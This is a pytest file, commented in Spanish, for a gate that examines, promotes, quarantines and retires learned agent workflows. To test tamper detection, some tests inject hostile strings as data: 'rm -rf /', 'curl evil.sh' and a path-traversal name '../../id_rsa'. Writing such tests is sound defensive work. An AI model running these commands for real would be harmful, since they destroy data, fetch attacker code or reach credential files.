"""
tests/test_flujos_examen.py
===========================
La compuerta de los flujos aprendidos (cognia/flujos/examen.py).

Todo en SECO: sin modelo, sin red y sin tocar el ~/.cognia real. El unico
"agente" que corre es un callable inyectado que escribe ficheros de verdad en
un workspace temporal — asi el examen se prueba ENTERO (postcondiciones sobre
disco incluidas) sin mockear la funcionalidad que se esta midiendo.

Lo que estos tests defienden, incidente por incidente:
 * un flujo que solo funciona con los parametros de su grabacion NO aprueba;
 * "salio bien" sin postcondiciones NO es 'verificado', es 'no_examinable';
 * la cuarentena excluye aunque el fichero siga fisicamente en verificado/
   (el `_cuarentena/` que funcionaba por accidente porque el glob no lo miraba);
 * un flujo aprobado que empieza a fallar en produccion se poda solo;
 * el contrafactual reporta LOS DOS brazos, gane quien gane.
"""
from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from cognia.flujos import examen as ex


# ── Andamiaje ────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def almacen_aislado(tmp_path, monkeypatch):
    """Redirige el almacen entero a tmp_path. COGNIA_HOME tambien, por si
    alguna ruta se cuela por el default (nunca escribir en el home real)."""
    monkeypatch.setenv("COGNIA_HOME", str(tmp_path / "home"))
    monkeypatch.setenv("COGNIA_FLUJOS_DIR", str(tmp_path / "flujos"))
    monkeypatch.delenv("COGNIA_FLUJOS_TTL_DIAS", raising=False)
    monkeypatch.delenv("COGNIA_FLUJOS_CONTRAFACTUAL", raising=False)
    return tmp_path


def flujo_demo(nombre="informe"):
    """Un flujo realista: escribe un fichero y un JSON de resumen."""
    return {
        "nombre": nombre,
        "tarea": "generar el informe del dia",
        "pasos": [
            {"tool": "escribir_archivo", "args": "{ruta} | {texto}"},
            {"tool": "escribir_archivo", "args": "resumen.json | {{}}"},
        ],
        # ruta a RAIZ del workspace a proposito: el caso estructural la anida
        # un nivel, y ahi es donde se cae el flujo que memorizo.
        "parametros": {"ruta": "informe.md", "texto": "hola", "veces": 2},
        "postcondiciones": [
            {"tipo": "existe", "ruta": "{ruta}"},
            {"tipo": "contiene", "ruta": "{ruta}", "texto": "{texto}"},
            {"tipo": "json_clave", "ruta": "resumen.json", "clave": "lineas"},
        ],
    }


def _reproducir_bueno(flujo, params, workspace):
    """Un flujo que APRENDIO: respeta los parametros que le den, crea los
    directorios que hagan falta y deja el mundo como promete."""
    ws = Path(workspace)
    destino = ws / params["ruta"]
    destino.parent.mkdir(parents=True, exist_ok=True)
    lineas = [params["texto"]] * int(params.get("veces", 1))
    destino.write_text("\n".join(lineas), encoding="utf-8")
    (ws / "resumen.json").write_text(
        json.dumps({"lineas": len(lineas)}), encoding="utf-8")
    return {"ok": True, "pasos": 2, "salida": f"escrito {params['ruta']}"}


def _reproducir_memorizado(flujo, params, workspace):
    """Un flujo que MEMORIZO: asume que el fichero cuelga de la raiz y no crea
    subdirectorios. Con un renombrado sobrevive; con el caso ESTRUCTURAL (que
    anida un nivel) se cae. Es exactamente el fallo que el examen busca."""
    ws = Path(workspace)
    destino = ws / params["ruta"]
    if not destino.parent.exists():
        return {"ok": False, "pasos": 1, "salida": "",
                "error": "no existe el directorio destino"}
    lineas = [params["texto"]] * int(params.get("veces", 1))
    destino.write_text("\n".join(lineas), encoding="utf-8")
    (ws / "resumen.json").write_text(
        json.dumps({"lineas": len(lineas)}), encoding="utf-8")
    return {"ok": True, "pasos": 2, "salida": "ok"}


# ── generar_casos ────────────────────────────────────────────────────────────

def test_generar_casos_es_determinista_y_no_repite_la_grabacion(tmp_path):
    f = flujo_demo()
    a = ex.generar_casos(f, n=3)
    b = ex.generar_casos(f, n=3)
    assert a == b, "generar_casos tiene que ser deterministico"
    assert len(a) == 3
    for caso in a:
        assert caso["params"] != f["parametros"], \
            "un caso igual a la grabacion no prueba nada"


def test_al_menos_un_caso_cambia_la_ESTRUCTURA_no_solo_el_nombre():
    f = flujo_demo()
    casos = ex.generar_casos(f, n=3)
    estructurales = [c for c in casos if c["estructural"]]
    assert len(estructurales) >= 1
    est = estructurales[0]
    # profundidad de ruta distinta: 'informe.md' -> 'sub_cN/informe_cN.md'
    orig_profundidad = f["parametros"]["ruta"].count("/")
    assert est["params"]["ruta"].count("/") > orig_profundidad
    # y una clave que la grabacion no tenia
    assert set(est["params"]) - set(f["parametros"])


def test_completar_fn_no_puede_debilitar_el_examen():
    """Si el enriquecedor devuelve los parametros de la grabacion, se
    DESCARTA: el examen no se deja convertir en espejo desde fuera."""
    f = flujo_demo()

    def _completar_traidor(flujo, caso_base, i):
        return {"params": dict(flujo["parametros"])}

    casos = ex.generar_casos(f, n=2, completar_fn=_completar_traidor)
    for caso in casos:
        assert caso["enriquecido"] is False
        assert caso["params"] != f["parametros"]
        assert "descartado" in caso.get("aviso", "")


def test_completar_fn_que_revienta_no_rompe_la_generacion():
    def _explota(flujo, caso_base, i):
        raise RuntimeError("el LLM se cayo")

    casos = ex.generar_casos(flujo_demo(), n=2, completar_fn=_explota)
    assert len(casos) == 2
    assert all("completar_fn fallo" in c.get("aviso", "") for c in casos)


def test_acepta_la_forma_params_del_generalizador(tmp_path):
    """generalizador.py emite params=[{nombre,tipo,ejemplo,obligatorio}] en vez
    de parametros={clave: valor}. Si la compuerta no leyera esa forma, no
    generaria ni un caso para los flujos REALES del subsistema."""
    f = flujo_demo()
    f.pop("parametros")
    f["params"] = [
        {"nombre": "ruta", "tipo": "ruta", "ejemplo": "informe.md",
         "obligatorio": True},
        {"nombre": "texto", "tipo": "texto", "ejemplo": "hola",
         "obligatorio": False},
        {"nombre": "veces", "tipo": "numero", "ejemplo": 2,
         "obligatorio": False},
    ]
    assert ex.parametros_grabacion(f) == {"ruta": "informe.md",
                                          "texto": "hola", "veces": 2}
    casos = ex.generar_casos(f, n=3)
    assert len(casos) == 3
    v = ex.examinar(f, casos, _reproducir_bueno, workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_VERIFICADO, v["motivo"]
    # y el espejo se sigue detectando con esta forma
    espejo = [{"nombre": "espejo", "params": ex.parametros_grabacion(f)}]
    assert ex.examinar(f, espejo, _reproducir_bueno,
                       workspace_tmp=str(tmp_path))["estado"] == ex.V_NO_EXAMINABLE


def test_flujo_sin_parametros_no_genera_casos():
    f = flujo_demo()
    f.pop("parametros")
    assert ex.generar_casos(f) == []


# ── examinar ─────────────────────────────────────────────────────────────────

def test_flujo_que_aprueba_queda_verificado(tmp_path):
    f = flujo_demo()
    casos = ex.generar_casos(f, n=3)
    v = ex.examinar(f, casos, _reproducir_bueno, workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_VERIFICADO, v["motivo"]
    assert v["tasa_exito"] == 1.0
    assert len(v["casos"]) == 3
    assert all(c["ok"] for c in v["casos"])
    assert v["evidencia"]["estructurales"] >= 1
    assert v["evidencia"]["checks_fallados"] == 0
    assert v["firma_flujo"] == ex.firma_flujo(f)


def test_flujo_que_falla_1_de_3_queda_rechazado(tmp_path):
    """El memorizado pasa los renombrados y se cae en el estructural: 2/3."""
    f = flujo_demo()
    casos = ex.generar_casos(f, n=3)
    v = ex.examinar(f, casos, _reproducir_memorizado, workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_RECHAZADO, v["motivo"]
    fallados = [c for c in v["casos"] if not c["ok"]]
    assert len(fallados) == 1
    assert fallados[0]["estructural"] is True
    assert v["tasa_exito"] == pytest.approx(2 / 3)
    assert fallados[0]["motivo"], "un caso fallado tiene que decir POR QUE"


def test_sin_postcondiciones_es_no_examinable(tmp_path):
    f = flujo_demo()
    f.pop("postcondiciones")
    v = ex.examinar(f, ex.generar_casos(f), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_NO_EXAMINABLE
    assert "postcondiciones" in v["motivo"]
    # y no_examinable NO promueve
    assert ex.promover(f, v)["ok"] is False


def test_postcondiciones_solo_de_texto_son_no_examinables(tmp_path):
    """Juzgar por lo que el flujo dice de si mismo es el fallo del contrato
    interno (medido: al nivel del azar)."""
    f = flujo_demo()
    f["postcondiciones"] = [{"tipo": "salida_contiene", "texto": "escrito"}]
    v = ex.examinar(f, ex.generar_casos(f), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_NO_EXAMINABLE
    assert "TEXTO" in v["motivo"]


def test_tipo_de_postcondicion_desconocido_invalida_el_examen(tmp_path):
    """Un check que no se sabe correr NO se ignora en silencio: eso es un
    gate que pasa por el motivo equivocado."""
    f = flujo_demo()
    f["postcondiciones"].append({"tipo": "el_modelo_dice_que_si"})
    v = ex.examinar(f, ex.generar_casos(f), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_NO_EXAMINABLE
    assert "desconocido" in v["motivo"]


def test_postcondicion_comando_sin_ejecutar_fn_es_no_examinable(tmp_path):
    f = flujo_demo()
    f["postcondiciones"] = [{"tipo": "existe", "ruta": "{ruta}"},
                            {"tipo": "comando", "cmd": "pytest -q", "codigo": 0}]
    v = ex.examinar(f, ex.generar_casos(f), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_NO_EXAMINABLE
    assert "ejecutar_fn" in v["motivo"]

    # con el ejecutor inyectado, el mismo flujo SI se puede juzgar
    def _ejecutar(cmd, workspace):
        return {"codigo": 0, "salida": "3 passed"}

    v2 = ex.examinar(f, ex.generar_casos(f), _reproducir_bueno,
                     workspace_tmp=str(tmp_path), ejecutar_fn=_ejecutar)
    assert v2["estado"] == ex.V_VERIFICADO, v2["motivo"]


def test_caso_identico_a_la_grabacion_se_ignora_y_no_aprueba(tmp_path):
    """Un examen hecho solo con los valores originales es un espejo."""
    f = flujo_demo()
    espejo = [{"nombre": "espejo", "params": dict(f["parametros"])}]
    v = ex.examinar(f, espejo, _reproducir_bueno, workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_NO_EXAMINABLE
    assert v["casos"][0]["ignorado"] is True
    assert "espejo" in v["motivo"]

    # y tampoco cuela disfrazado con una clave decorativa de mas
    disfrazado = dict(f["parametros"])
    disfrazado["adorno"] = "x"
    v2 = ex.examinar(f, [{"nombre": "disfrazado", "params": disfrazado}],
                     _reproducir_bueno, workspace_tmp=str(tmp_path))
    assert v2["estado"] == ex.V_NO_EXAMINABLE
    assert v2["casos"][0]["ignorado"] is True


def test_reproduccion_que_revienta_reprueba_con_el_error_real(tmp_path):
    def _revienta(flujo, params, workspace):
        raise RuntimeError("backend caido")

    f = flujo_demo()
    v = ex.examinar(f, ex.generar_casos(f, n=1), _revienta,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_RECHAZADO
    assert "backend caido" in v["casos"][0]["motivo"]


def test_cada_caso_corre_en_su_propio_workspace(tmp_path):
    """El estado inducido por un caso no puede aprobar al siguiente."""
    vistos = []

    def _espia(flujo, params, workspace):
        vistos.append(workspace)
        return _reproducir_bueno(flujo, params, workspace)

    f = flujo_demo()
    ex.examinar(f, ex.generar_casos(f, n=3), _espia, workspace_tmp=str(tmp_path))
    assert len(set(vistos)) == 3


def test_postcondicion_fuera_del_workspace_no_aprueba(tmp_path):
    """Mirar un fichero de fuera del sandbox deja pasar al flujo por los
    restos de la grabacion."""
    fuera = tmp_path / "testigo.txt"
    fuera.write_text("existo", encoding="utf-8")
    f = flujo_demo()
    f["postcondiciones"] = [{"tipo": "existe", "ruta": "../testigo.txt"}]
    v = ex.examinar(f, ex.generar_casos(f, n=1), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_RECHAZADO
    assert "fuera del workspace" in v["casos"][0]["checks"][0]["detalle"]


def test_fixture_se_siembra_en_cada_workspace(tmp_path):
    f = flujo_demo()
    f["fixture"] = {"datos/entrada.txt": "1\n2\n3\n"}
    f["postcondiciones"] = [{"tipo": "lineas_min", "ruta": "datos/entrada.txt",
                             "n": 3},
                            {"tipo": "existe", "ruta": "{ruta}"}]
    v = ex.examinar(f, ex.generar_casos(f, n=2), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_VERIFICADO, v["motivo"]


def test_acepta_el_vocabulario_del_generalizador(tmp_path):
    """El generalizador emite fichero_existe / fichero_contiene /
    comando_exit0 (ver cognia/flujos/reproductor.py). Si la compuerta no los
    entendiera, TODO flujo del subsistema saldria 'no_examinable' y la pieza
    no serviria para lo unico que tiene que hacer."""
    def _ejecutar(cmd, workspace):
        return {"codigo": 0, "salida": "ok"}

    f = flujo_demo()
    f["postcondiciones"] = [
        {"tipo": "fichero_existe", "ruta": "{ruta}"},
        {"tipo": "fichero_contiene", "ruta": "{ruta}", "contiene": "{texto}"},
        {"tipo": "fichero_contiene", "ruta": "{ruta}", "patron": r"hola.*",
         "regex": True},
        {"tipo": "comando_exit0", "comando": "pytest -q"},
    ]
    v = ex.examinar(f, ex.generar_casos(f, n=2), _reproducir_bueno,
                    workspace_tmp=str(tmp_path), ejecutar_fn=_ejecutar)
    assert v["estado"] == ex.V_VERIFICADO, v["motivo"]
    tipos = [c["tipo"] for c in v["casos"][0]["checks"]]
    assert tipos == ["existe", "contiene", "contiene", "comando"]
    assert v["casos"][0]["checks"][0]["alias_de"] == "fichero_existe"


def test_patron_regex_invalido_no_aprueba(tmp_path):
    f = flujo_demo()
    f["postcondiciones"] = [{"tipo": "fichero_contiene", "ruta": "{ruta}",
                             "patron": "[sin cerrar", "regex": True}]
    v = ex.examinar(f, ex.generar_casos(f, n=1), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_RECHAZADO
    assert "regex invalido" in v["casos"][0]["checks"][0]["detalle"]


# ── promover / cuarentena / aptos_para_sugerir ───────────────────────────────

def _verificar_y_promover(f, tmp_path):
    v = ex.examinar(f, ex.generar_casos(f, n=3), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    return v, ex.promover(f, v)


def test_promover_solo_con_veredicto_verificado(tmp_path):
    f = flujo_demo()
    ex.guardar_borrador(f)
    assert ex.aptos_para_sugerir() == []

    v, dec = _verificar_y_promover(f, tmp_path)
    assert dec["ok"] is True and dec["estado"] == ex.VERIFICADO
    nombres = [d["nombre"] for d in ex.aptos_para_sugerir()]
    assert nombres == ["informe"]

    # el rechazado no promueve
    malo = flujo_demo("memorizado")
    vm = ex.examinar(malo, ex.generar_casos(malo, n=3), _reproducir_memorizado,
                     workspace_tmp=str(tmp_path))
    dm = ex.promover(malo, vm)
    assert dm["ok"] is False
    assert "memorizado" not in [d["nombre"] for d in ex.aptos_para_sugerir()]


def test_promover_rechaza_un_flujo_cambiado_despues_del_examen(tmp_path):
    """Sin la firma, 'verificado' solo significa 'hubo un examen, de algo'."""
    f = flujo_demo()
    v = ex.examinar(f, ex.generar_casos(f, n=2), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    assert v["estado"] == ex.V_VERIFICADO
    f["pasos"].append({"tool": "ejecutar_comando", "args": "rm -rf /"})
    dec = ex.promover(f, v)
    assert dec["ok"] is False
    assert "cambio DESPUES del examen" in dec["motivo"]
    assert ex.aptos_para_sugerir() == []


def test_cuarentena_excluye_aunque_el_fichero_siga_ahi(tmp_path):
    """LA CUARENTENA ES CODIGO, NO UNA CARPETA."""
    f = flujo_demo()
    _verificar_y_promover(f, tmp_path)
    assert [d["nombre"] for d in ex.aptos_para_sugerir()] == ["informe"]

    res = ex.cuarentena(f, "rompio el repo en produccion")
    assert res["estado"] == ex.CUARENTENA
    assert ex.aptos_para_sugerir() == []

    # y ahora se REPONE el fichero en verificado/ a mano (un glob de otro
    # modulo, una copia de seguridad, un merge): el indice sigue mandando.
    ruta_verificado = ex.dir_flujos() / ex.VERIFICADO / "informe.json"
    ruta_verificado.parent.mkdir(parents=True, exist_ok=True)
    ruta_verificado.write_text(json.dumps(f), encoding="utf-8")
    assert ruta_verificado.exists()
    assert ex.aptos_para_sugerir() == [], \
        "un fichero en verificado/ no puede resucitar a un flujo en cuarentena"
    assert ex.estado_de("informe")["estado"] == ex.CUARENTENA
    assert "rompio el repo" in ex.estado_de("informe")["motivo"]


def test_fichero_sin_entrada_en_el_indice_no_es_apto(tmp_path):
    """Fail-closed: la carpeta no es la autoridad. Un fichero suelto en
    verificado/ (copiado, restaurado, generado por otra version) NO habilita
    nada — tiene que haber un veredicto que lo declare."""
    ruta = ex.dir_flujos() / ex.VERIFICADO / "colado.json"
    ruta.parent.mkdir(parents=True, exist_ok=True)
    ruta.write_text(json.dumps(flujo_demo("colado")), encoding="utf-8")
    assert ex.aptos_para_sugerir() == []


def test_flujo_editado_despues_de_aprobar_deja_de_ser_apto(tmp_path):
    f = flujo_demo()
    _verificar_y_promover(f, tmp_path)
    assert len(ex.aptos_para_sugerir()) == 1

    ruta = ex.dir_flujos() / ex.VERIFICADO / "informe.json"
    cuerpo = json.loads(ruta.read_text(encoding="utf-8"))
    cuerpo["pasos"].append({"tool": "ejecutar_comando", "args": "curl evil.sh"})
    ruta.write_text(json.dumps(cuerpo), encoding="utf-8")
    assert ex.aptos_para_sugerir() == []


def test_veredicto_caducado_no_es_apto(tmp_path, monkeypatch):
    f = flujo_demo()
    _verificar_y_promover(f, tmp_path)
    assert len(ex.aptos_para_sugerir()) == 1
    monkeypatch.setenv("COGNIA_FLUJOS_TTL_DIAS", "30")
    import time as _t
    assert ex.aptos_para_sugerir(ahora=_t.time() + 31 * 86400) == []
    monkeypatch.setenv("COGNIA_FLUJOS_TTL_DIAS", "0")   # 0 = sin caducidad
    assert len(ex.aptos_para_sugerir(ahora=_t.time() + 31 * 86400)) == 1


def test_indice_corrupto_deja_todo_no_apto(tmp_path):
    f = flujo_demo()
    _verificar_y_promover(f, tmp_path)
    (ex.dir_flujos() / "indice.json").write_text("{ esto no es json",
                                                 encoding="utf-8")
    assert ex.aptos_para_sugerir() == []


def test_nombre_con_traversal_no_escribe_fuera_del_almacen(tmp_path):
    f = flujo_demo("../../id_rsa")
    v = ex.examinar(f, ex.generar_casos(f, n=1), _reproducir_bueno,
                    workspace_tmp=str(tmp_path))
    ex.promover(f, v)
    assert not (tmp_path / "id_rsa.json").exists()
    escritos = list((ex.dir_flujos() / ex.VERIFICADO).glob("*.json"))
    assert len(escritos) == 1
    assert ".." not in escritos[0].name


# ── decay ────────────────────────────────────────────────────────────────────

def test_decay_poda_tras_N_fallos_seguidos(tmp_path):
    f = flujo_demo()
    _verificar_y_promover(f, tmp_path)
    assert len(ex.aptos_para_sugerir()) == 1

    for i in range(ex.MAX_FALLOS_SEGUIDOS - 1):
        r = ex.registrar_uso("informe", ok=False)
        assert r["podado"] is False, f"podado demasiado pronto en el fallo {i + 1}"
        assert len(ex.aptos_para_sugerir()) == 1

    r = ex.registrar_uso("informe", ok=False)
    assert r["podado"] is True
    assert r["estado"] == ex.CUARENTENA
    assert "fallos SEGUIDOS" in r["motivo"]
    assert ex.aptos_para_sugerir() == []


def test_un_uso_ok_reinicia_la_racha_de_fallos(tmp_path):
    f = flujo_demo()
    _verificar_y_promover(f, tmp_path)
    ex.registrar_uso("informe", ok=False)
    ex.registrar_uso("informe", ok=False)
    r = ex.registrar_uso("informe", ok=True)
    assert r["fallos_seguidos"] == 0
    assert r["podado"] is False
    assert len(ex.aptos_para_sugerir()) == 1


def test_decay_por_tasa_de_produccion_pobre(tmp_path):
    """Alterna ok/fallo para que nunca haya 3 seguidos: lo que poda aca es la
    TASA (el flujo que aprobo el examen por suerte)."""
    f = flujo_demo()
    _verificar_y_promover(f, tmp_path)
    secuencia = [False, True, False, False, True, False, False]
    podado = False
    for ok in secuencia:
        r = ex.registrar_uso("informe", ok=ok)
        if r["podado"]:
            podado = True
            assert "tasa de produccion" in r["motivo"] or "SEGUIDOS" in r["motivo"]
            break
    assert podado is True
    assert ex.aptos_para_sugerir() == []


def test_registrar_uso_de_un_flujo_desconocido_no_lanza():
    r = ex.registrar_uso("no-existe", ok=True)
    assert r["ok"] is False
    assert "indice" in r["motivo"]


# ── contrafactual ────────────────────────────────────────────────────────────

def _agente_lento(tarea, params, workspace):
    """El agente normal resuelve lo mismo, pero le cuesta mas pasos."""
    ws = Path(workspace)
    destino = ws / params["ruta"]
    destino.parent.mkdir(parents=True, exist_ok=True)
    destino.write_text("\n".join([params["texto"]] * int(params.get("veces", 1))),
                       encoding="utf-8")
    (ws / "resumen.json").write_text(json.dumps({"lineas": 1}), encoding="utf-8")
    return {"ok": True, "pasos": 9, "salida": "hecho tras dar vueltas"}


def test_contrafactual_reporta_los_dos_brazos(tmp_path):
    f = flujo_demo()
    caso = ex.generar_casos(f, n=1)[0]
    r = ex.contrafactual(f, caso, _reproducir_bueno, _agente_lento,
                         workspace_tmp=str(tmp_path), activo=True)
    assert r["ejecutado"] is True
    assert r["ok_flujo"] is True and r["ok_agente"] is True
    assert r["pasos_flujo"] == 2 and r["pasos_agente"] == 9
    assert r["pared_flujo"] >= 0.0 and r["pared_agente"] >= 0.0
    assert r["gana_flujo"] is True
    assert "pasos" in r["motivo"]
    # los dos brazos se juzgan con las MISMAS postcondiciones
    assert len(r["checks_flujo"]) == len(f["postcondiciones"])
    assert len(r["checks_agente"]) == len(f["postcondiciones"])


def test_contrafactual_declara_que_el_flujo_PIERDE(tmp_path):
    """El caso incomodo: el flujo no cumple y el agente si. Si esto no se
    reportase, un flujo inutil quedaria 'con evidencia a favor'."""
    def _flujo_inutil(flujo, params, workspace):
        return {"ok": True, "pasos": 1, "salida": "no hice nada"}

    f = flujo_demo()
    caso = ex.generar_casos(f, n=1)[0]
    r = ex.contrafactual(f, caso, _flujo_inutil, _agente_lento,
                         workspace_tmp=str(tmp_path), activo=True)
    assert r["ejecutado"] is True
    assert r["ok_flujo"] is False and r["ok_agente"] is True
    assert r["gana_flujo"] is False
    assert "solo el agente" in r["motivo"]


def test_contrafactual_esta_apagado_por_defecto(tmp_path, monkeypatch):
    """Es caro: corre el agente entero. Va bajo bandera."""
    f = flujo_demo()
    caso = ex.generar_casos(f, n=1)[0]
    llamadas = []

    def _agente_espia(tarea, params, workspace):
        llamadas.append(tarea)
        return {"ok": True, "pasos": 1}

    r = ex.contrafactual(f, caso, _reproducir_bueno, _agente_espia,
                         workspace_tmp=str(tmp_path))
    assert r["ejecutado"] is False
    assert llamadas == [], "no puede correr el agente con la bandera apagada"
    assert "COGNIA_FLUJOS_CONTRAFACTUAL" in r["motivo"]

    monkeypatch.setenv("COGNIA_FLUJOS_CONTRAFACTUAL", "1")
    r2 = ex.contrafactual(f, caso, _reproducir_bueno, _agente_espia,
                          workspace_tmp=str(tmp_path))
    assert r2["ejecutado"] is True
    assert llamadas, "con la bandera encendida el brazo del agente SI corre"


def test_contrafactual_con_agente_que_revienta_reporta_igual(tmp_path):
    def _agente_roto(tarea, params, workspace):
        raise RuntimeError("sin backend")

    f = flujo_demo()
    caso = ex.generar_casos(f, n=1)[0]
    r = ex.contrafactual(f, caso, _reproducir_bueno, _agente_roto,
                         workspace_tmp=str(tmp_path), activo=True)
    assert r["ejecutado"] is True
    assert r["ok_flujo"] is True and r["ok_agente"] is False
    assert r["gana_flujo"] is True
    assert "sin backend" in r["error_agente"]


# ── el camino completo (lo que el orquestador va a cablear) ──────────────────

def test_examinar_y_decidir_promueve_al_bueno_y_deja_borrador_al_malo(tmp_path):
    bueno = flujo_demo("bueno")
    r1 = ex.examinar_y_decidir(bueno, _reproducir_bueno,
                               workspace_tmp=str(tmp_path))
    assert r1["veredicto"]["estado"] == ex.V_VERIFICADO
    assert r1["decision"]["estado"] == ex.VERIFICADO

    malo = flujo_demo("malo")
    r2 = ex.examinar_y_decidir(malo, _reproducir_memorizado,
                               workspace_tmp=str(tmp_path))
    assert r2["veredicto"]["estado"] == ex.V_RECHAZADO
    assert r2["decision"]["estado"] == ex.BORRADOR

    assert [d["nombre"] for d in ex.aptos_para_sugerir()] == ["bueno"]
    # el rechazado NO va a cuarentena: 'nunca demostro servir' y 'servia y
    # dejo de servir' son estados distintos
    assert ex.estado_de("malo")["estado"] == ex.BORRADOR


def test_el_examen_no_deja_basura_en_disco(tmp_path):
    f = flujo_demo()
    antes = set(os.listdir(tmp_path))
    ex.examinar(f, ex.generar_casos(f, n=3), _reproducir_bueno,
                workspace_tmp=str(tmp_path))
    despues = set(os.listdir(tmp_path))
    assert despues == antes, "los workspaces temporales se limpian"
